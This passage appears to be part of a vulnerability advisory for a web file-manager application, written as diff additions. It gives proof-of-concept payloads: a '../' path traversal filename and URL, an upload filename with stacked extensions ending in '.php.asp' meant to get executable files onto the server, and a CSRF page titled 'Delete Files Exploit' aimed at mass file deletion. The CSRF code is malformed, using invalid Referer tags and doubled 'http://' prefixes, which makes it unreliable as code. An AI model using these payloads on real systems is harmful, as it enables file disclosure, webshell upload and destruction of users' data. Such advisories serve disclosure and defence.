@@ -1,0 +1,68 @@
+Local File/Path Include Web Vulnerability
+Review: Index Listing 
+
+<tr><td title="../[FILE OR PATH REQUEST]<.png"><img src="/img/ext/png.png" align="absmiddle"> 
+<a href="/down?f=6">../[FILE OR PATH REQUEST].png</a></td><td style="text-align:center;">2013-02-10 18:46</td>
+<td>PNG Image</td><td><div title="27920" align="right">27,27 KB</div></td><td style="text-align:center;">
+<button class="btn btn-danger" onclick="deleteFile("6")">Delete</button></td></tr>
+
+
+PoC:
+--- Session Log ---
+[{"bytes":233966,"id":7,"name":"8765434.png","createDate":"2013-02-10 18:46","ext":"png","typeDesc":"file_type_png","size":"228,48 KB"},{"bytes":27920,"id":6,"name":"../[FILE OR PATH REQUEST].png","createDate":"2013-02-10 18:46","ext":"png","typeDesc":"file_type_png","size":"27,27 KB"},{"bytes":27920,"id":5,"name":"327.png","createDate":"2013-02-06 18:02","ext":"png","typeDesc":"file_type_png","size":"27,27 KB"},{"bytes":27920,"id":4,"name":"327.png","createDate":"2013-02-06 18:02","ext":"png","typeDesc":"file_type_png","size":"27,27 KB"}]
+
+
+... or
+
+http://www.example.com/photo?u=../[FILE OR PATH REQUEST]<
+
+
+
+1.1.2
+Local File Upload Web Vulnerability
+Review: Index Listing
+
+<tbody>
+<tr><td title="../[FILENAME+MULTIPLE EXTENSIONS].png.txt.iso.php.asp"><img src="/img/ext/file.png" align="absmiddle"> 
+<a href="/../[FILENAME+MULTIPLE EXTENSIONS].png.txt.iso.php.asp">../[FILENAME+MULTIPLE EXTENSIONS].png.txt.iso.php.asp</a></td>
+<td style="text-align:center;">2013-02-10 18:53</td><td>File</td><td><div title="98139" align="right">95,84 KB</div></td>
+<td style="text-align:center;"><button class="btn btn-danger" onclick="deleteFile("8")">Delete</button></td></tr>
+<tr><td title="8765434.png"><img src="/img/ext/png.png" align="absmiddle"> <a href="/down?f=7">8765434.png</a></td>
+<td style="text-align:center;">2013-02-10 18:46</td><td>PNG Image</td><td><div title="233966" align="right">228,48 KB</div></td>
+<td style="text-align:center;"><button class="btn btn-danger" onclick="deleteFile("7")">Delete</button></td></tr><tr><td title="327.png">
+<img src="/img/ext/png.png" align="absmiddle"> <a href="/down?f=6">327.png</a></td><td style="text-align:center;">
+2013-02-10 18:46</td><td>PNG Image</td><td><div title="27920" align="right">27,27 KB</div></td><td style="text-align:center;">
+<button class="btn btn-danger" onclick="deleteFile("6")">Delete</button></td></tr><tr><td title="327.png">
+<img src="/img/ext/png.png" align="absmiddle"> <a href="/down?f=5">327.png</a></td><td style="text-align:center;">
+2013-02-06 18:02</td><td>PNG Image</td><td><div title="27920" align="right">27,27 KB</div></td><td style="text-align:center;">
+<button class="btn btn-danger" onclick="deleteFile("5")">Delete</button></td></tr><tr><td title="327.png">
+<img src="/img/ext/png.png" align="absmiddle"> <a href="/down?f=4">327.png</a></td><td style="text-align:center;">
+2013-02-06 18:02</td><td>PNG Image</td><td><div title="27920" align="right">27,27 KB</div></td><td style="text-align:center;">
+<button class="btn btn-danger" onclick="deleteFile("4")">Delete</button></td></tr>
+</tbody>
+
+
+
+
+1.2
+The client side cross site request forgery web vulnerability can be exploited by remote attackers without application user account 
+and with medium or high required user interaction. For demonstration or reproduce ...
+
+&lt;html&gt;
+&lt;head&gt;&lt;body&gt;
+&lt;title&gt;POC CSRF - Delete Files Exploit&lt;/title&gt;
+&lt;Referer=http://www.example.com/delete?f=9&gt;
+&lt;Referer=http://www.example.com/delete?f=9&gt;
+&lt;Referer=http://http://www.example.com/delete?f=1&gt;
+&lt;Referer=http://http://www.example.com/delete?f=2&gt;
+&lt;Referer=http://http://www.example.com/delete?f=3&gt;
+&lt;Referer=http://http://www.example.com/delete?f=4&gt;
+&lt;Referer=http://http://www.example.com/delete?f=5&gt;
+&lt;Referer=http://http://www.example.com/delete?f=6&gt;
+&lt;Referer=http://http://www.example.com/delete?f=7&gt;
+&lt;Referer=http://http://www.example.com/delete?f=8&gt;
+&lt;Referer=http://http://www.example.com/delete?f=9&gt;
+&lt;Referer=http://http://www.example.com/delete?f=10&gt;
+&lt;/body&gt;&lt;/head&gt;
+&lt;/html&gt;
+
